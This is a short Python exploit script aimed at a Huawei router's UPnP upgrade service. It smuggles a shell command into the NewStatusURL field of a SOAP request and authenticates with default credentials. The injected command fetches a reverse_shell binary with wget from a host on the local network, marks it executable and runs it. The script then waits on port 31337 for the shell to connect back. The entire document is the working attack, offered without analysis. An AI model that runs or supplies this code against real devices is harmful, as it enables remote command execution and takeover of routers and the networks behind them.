#!/usr/bin/python3

import requests
from requests.auth import HTTPDigestAuth
from pwn import *
from threading import Thread

cmd = ';wget http://192.168.115.129/reverse_shell;chmod 777 reverse_shell;./reverse_shell;' #download file, authorized and execute
assert(len(cmd) < 255)

data = "<?xml version=\"1.0\" ?>\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n    <NewStatusURL>" + cmd + "</NewStatusURL>\n<NewDownloadURL>HUAWEIUPNP</NewDownloadURL>\n</u:Upgrade>\n    </s:Body>\n    </s:Envelope>"
url = "http://192.168.115.130:37215/ctrlt/DeviceUpgrade_1" #the router ip and port

def attack():
    try:
        requests.post(url, auth=HTTPDigestAuth('dslf-config', 'admin'), data=data)
    except Exception as e:
        print(e)

thread = Thread(target=attack)
thread.start()

io = listen(31337)
io.wait_for_connection()
io.interactive()

thread.join()
